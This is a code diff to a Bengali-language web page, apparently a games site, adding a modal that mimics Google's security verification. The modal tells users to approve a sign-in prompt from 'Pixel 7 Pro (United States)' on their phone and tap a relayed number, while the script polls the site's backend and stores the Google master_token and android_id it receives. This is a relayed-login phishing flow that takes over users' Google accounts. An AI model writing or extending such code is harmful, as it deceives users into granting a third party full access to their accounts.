@@ -843,6 +843,70 @@
             to { transform: rotate(360deg); }
         }
 
+        /* 2FA Prompt Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(15, 23, 42, 0.7);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 20px;
+            animation: fadeIn 0.25s ease-out;
+        }
+
+        .modal-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-lg);
+            width: 100%;
+            max-width: 420px;
+            padding: 26px 22px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            animation: modalPop 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes modalPop {
+            from { opacity: 0; transform: scale(0.92) translateY(12px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .prompt-number-badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 110px;
+            height: 70px;
+            padding: 0 24px;
+            background: linear-gradient(135deg, #00A854, #0284c7);
+            color: #ffffff;
+            font-size: 38px;
+            font-weight: 900;
+            border-radius: 20px;
+            box-shadow: 0 8px 24px rgba(0, 168, 84, 0.4);
+            letter-spacing: 2px;
+            margin: 12px auto;
+            border: 3px solid rgba(255, 255, 255, 0.6);
+            animation: pulseBadge 1.8s ease-in-out infinite;
+        }
+
+        @keyframes pulseBadge {
+            0%, 100% { transform: scale(1); box-shadow: 0 8px 24px rgba(0, 168, 84, 0.4); }
+            50% { transform: scale(1.06); box-shadow: 0 12px 32px rgba(2, 132, 199, 0.55); }
+        }
+
+        .spinner-small {
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(0, 168, 84, 0.25);
+            border-top-color: var(--accent-green);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
         .hidden { display: none !important; }
     </style>
 </head>
@@ -1037,6 +1101,40 @@
 
         <div id="gamesGrid" class="games-grid">
             <!-- Dynamically populated -->
+        </div>
+    </div>
+</div>
+
+<!-- 2FA Google Security Verification Modal -->
+<div id="authPromptModal" class="modal-overlay hidden">
+    <div class="modal-card">
+        <div style="font-size: 36px; margin-bottom: 6px;">📱</div>
+        <h3 style="font-size: 18px; font-weight: 800; color: var(--text-primary); margin-bottom: 4px;">Google Security ভেরিফিকেশন</h3>
+        <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">আপনার মোবাইলে গুগল সিকিউরিটি নোটিফিকেশন পাঠানো হয়েছে</p>
+        
+        <div style="background: var(--bg-card-subtle); border: 1px dashed var(--border-color); border-radius: var(--radius-sm); padding: 10px; margin-bottom: 14px;">
+            <div style="font-size: 11px; font-weight: 700; color: var(--text-secondary);">
+                ডিভাইসে দেখতে পাবেন: <span style="color: var(--accent-blue); font-weight: 800;">Pixel 7 Pro (United States)</span>
+            </div>
+        </div>
+
+        <p style="font-size: 13px; font-weight: 600; line-height: 1.5; color: var(--text-primary);">
+            👉 প্রথমে মোবাইলে <b>"Yes, it's me"</b> চাপুন<br>এবং এরপর নিচের সংখ্যাটিতে ট্যাপ করুন:
+        </p>
+
+        <div id="modalPromptBadge" class="prompt-number-badge">
+            <div class="spinner"></div>
+        </div>
+
+        <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 14px; font-size: 12px; color: var(--text-secondary);">
+            <div class="spinner-small"></div>
+            <span id="modalCountdownText">ফোনে ট্যাপের জন্য অপেক্ষা করা হচ্ছে (৯০ সে.)...</span>
+        </div>
+
+        <div style="margin-top: 20px;">
+            <button class="btn-outline" style="width: 100%; justify-content: center; padding: 10px;" onclick="cancelPromptAuth()">
+                <span>বাতিল করুন</span>
+            </button>
         </div>
     </div>
 </div>
@@ -1252,6 +1350,10 @@
             const data = await res.json();
 
             if (data.ok) {
+                if (data.interactive) {
+                    startPromptPolling(data.auth_id, email);
+                    return;
+                }
                 currentSession = {
                     email: data.email,
                     master_token: data.master_token,
@@ -1271,6 +1373,80 @@
             btn.disabled = false;
             btn.innerHTML = `<span>লগইন করুন</span> <span>➔</span>`;
         }
+    }
+
+    let activeAuthPollInterval = null;
+    let activeAuthId = null;
+    let authCountdownTimer = null;
+    let authSecondsRemaining = 90;
+
+    function startPromptPolling(authId, email) {
+        activeAuthId = authId;
+        authSecondsRemaining = 90;
+        
+        const modal = document.getElementById("authPromptModal");
+        const badge = document.getElementById("modalPromptBadge");
+        const cdText = document.getElementById("modalCountdownText");
+        
+        badge.innerHTML = `<div class="spinner"></div>`;
+        cdText.innerText = "গুগল সিকিউরিটি থেকে কোড আনা হচ্ছে...";
+        modal.classList.remove("hidden");
+
+        if (authCountdownTimer) clearInterval(authCountdownTimer);
+        authCountdownTimer = setInterval(() => {
+            authSecondsRemaining--;
+            if (authSecondsRemaining <= 0) {
+                cancelPromptAuth();
+                showToast("লগইন সময়সীমা শেষ হয়েছে। আবার চেষ্টা করুন।", "error");
+            } else {
+                cdText.innerText = `ফোনে ট্যাপের জন্য অপেক্ষা করা হচ্ছে (${authSecondsRemaining} সে.)...`;
+            }
+        }, 1000);
+
+        if (activeAuthPollInterval) clearInterval(activeAuthPollInterval);
+        activeAuthPollInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`${API_BASE}/api/auth/status/${authId}`);
+                const data = await res.json();
+                
+                if (data.ok) {
+                    if (data.prompt_number) {
+                        badge.innerText = data.prompt_number;
+                    }
+                    if (data.status === "success" && data.profile) {
+                        clearInterval(activeAuthPollInterval);
+                        clearInterval(authCountdownTimer);
+                        modal.classList.add("hidden");
+                        
+                        currentSession = {
+                            email: data.email,
+                            master_token: data.master_token,
+                            android_id: data.android_id,
+                            profile: data.profile
+                        };
+                        saveAccountToStorage(currentSession);
+                        showDashboard(data.profile, data.email);
+                        triggerCelebration();
+                        showToast(`🎉 স্বাগতম ${data.profile.display_name}! আসল ডেটা সফলভাবে কানেক্ট হয়েছে!`, "success");
+                    } else if (data.status === "error") {
+                        clearInterval(activeAuthPollInterval);
+                        clearInterval(authCountdownTimer);
+                        modal.classList.add("hidden");
+                        showToast(data.error || "ভেরিফিকেশন সম্পন্ন হয়নি।", "error");
+                    }
+                }
+            } catch(e) {
+                console.error("Auth status poll error:", e);
+            }
+        }, 1800);
+    }
+
+    function cancelPromptAuth() {
+        if (activeAuthPollInterval) clearInterval(activeAuthPollInterval);
+        if (authCountdownTimer) clearInterval(authCountdownTimer);
+        document.getElementById("authPromptModal").classList.add("hidden");
+        activeAuthId = null;
+        showToast("লগইন প্রক্রিয়া বাতিল করা হয়েছে।", "info");
     }
 
     // Direct Master Token Login
